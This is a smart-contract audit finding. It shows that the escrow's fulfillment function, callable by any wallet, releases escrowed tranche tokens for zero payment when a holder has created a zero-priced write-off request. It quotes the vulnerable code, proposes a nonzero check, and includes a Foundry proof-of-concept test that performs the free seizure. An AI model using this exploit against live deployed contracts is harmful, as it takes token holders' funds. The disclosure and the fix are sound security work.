### Title
Zero-priced write-off requests allow a fulfiller to seize escrowed tranches without payment - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary

`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` rejects a zero tranche amount but accepts `underlyingsRequested == 0`, creating a valid request whose fulfillment pays nothing. `fullfillWriteOffRequest` is callable by any wallet and releases the complete escrowed tranche balance after checking only that the payment is at least the requested amount, so any fulfiller can call it with `_underlyings == 0`. [1](#0-0) [2](#0-1) 

### Finding Description

The request lifecycle validates the token-side quantity but omits equivalent validation for the requested consideration:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol
if (amount == 0) revert NotAllowed();
// underlyingsRequested is not checked
```

The escrowed tranches are transferred before the malformed zero-price request is stored. Fulfillment then accepts `_underlyings >= currentRequest.underlyings`; with a stored request of zero, `_underlyings == 0` succeeds. The zero-value `safeTransferFrom` and zero-value seller transfer complete, after which the fulfiller receives `currentRequest.tranches`. [3](#0-2) [4](#0-3) 

The analogous missing-boundary-validation flaw is therefore in the escrow’s attacker-callable settlement path rather than in an unbounded processing loop. The attacker is an ordinary fulfiller, which the threat model explicitly permits, and no privileged call is required after the victim has created the zero-priced request. [5](#0-4) 

### Impact Explanation

A fulfiller receives every tranche token escrowed in the victim’s request while paying zero underlying tokens. For a request containing 10,000 AA tranches, the quantified loss is all 10,000 tranche tokens transferred from the escrow to the attacker, with no corresponding recovery of underlying value for the seller. [6](#0-5) 

This breaks the escrow’s one-request/one-consideration invariant: the protocol records a sell request and releases collateral, but the configured purchase price can be zero and still be treated as fulfilled. [7](#0-6) [8](#0-7) 

### Likelihood Explanation

Exploitation requires a tranche holder to submit a zero-valued `underlyingsRequested` during a running epoch, then an arbitrary fulfiller can execute it before the holder cancels. The holder-side prerequisite lowers likelihood, but the operation is a single public call and fulfiller access is intentionally unrestricted; no borrower, owner, manager, KYC status, epoch manipulation, or privileged role is needed. [9](#0-8) [10](#0-9) 

Existing coverage verifies that `amount == 0` is rejected and that underpayment is rejected, but it does not cover creation with a zero underlying ask followed by a zero-value fulfillment. [11](#0-10) [12](#0-11) 

### Recommendation

Reject malformed write-off requests where either side of the trade is zero:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

If partial request amendments are ever introduced, apply the same nonzero check to each added amount and preserve the aggregate accounting invariant. Existing zero-priced requests can already be canceled by their owners through `deleteWriteOffRequest`, which returns the escrowed tranches. [13](#0-12) 

### Proof of Concept

Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, whose fork setup already deploys the escrow, selects the AA tranche, approves the escrow for `LP`, and leaves the epoch running. [14](#0-13) 

```solidity
// test/foundry/IdleCreditVaultWriteOffEscrow.t.sol
function testZeroAskWriteOffCanBeFulfilledForFree() external {
    address attacker = makeAddr("free-writeoff-fulfiller");
    uint256 requestedTranches = tranche.balanceOf(LP);
    assertGt(requestedTranches, 0, "LP needs tranches");

    uint256 sellerTranchePre = tranche.balanceOf(LP);
    uint256 attackerUnderlyingPre = underlying.balanceOf(attacker);

    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    (uint256 tranchesStored, uint256 underlyingsStored) =
        escrow.userRequests(LP);
    assertEq(tranchesStored, requestedTranches, "tranches not escrowed");
    assertEq(underlyingsStored, 0, "zero ask must be accepted for this PoC");

    // No underlying approval is needed: fulfillment pays 0.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    (tranchesStored, underlyingsStored) = escrow.userRequests(LP);
    assertEq(tranchesStored, 0, "request not cleared");
    assertEq(underlyingsStored, 0, "request ask not cleared");
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingPre, "attacker paid funds");
    assertEq(underlying.balanceOf(LP), 0, "seller unexpectedly received funds");
    assertEq(tranche.balanceOf(attacker), requestedTranches, "attacker did not seize tranches");
    assertEq(tranche.balanceOf(LP), sellerTranchePre - requestedTranches, "seller loss mismatch");
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
```

```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

```text
  function testFullfillWriteOffRequestWithUnderlyingUnderpayReverts() external {
    uint256 requestedUnderlyings = 10000e6;
    uint256 underpayUnderlyings = requestedUnderlyings - 1;
    uint256 requestedTranches = 10000e18;

    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, requestedUnderlyings);
```
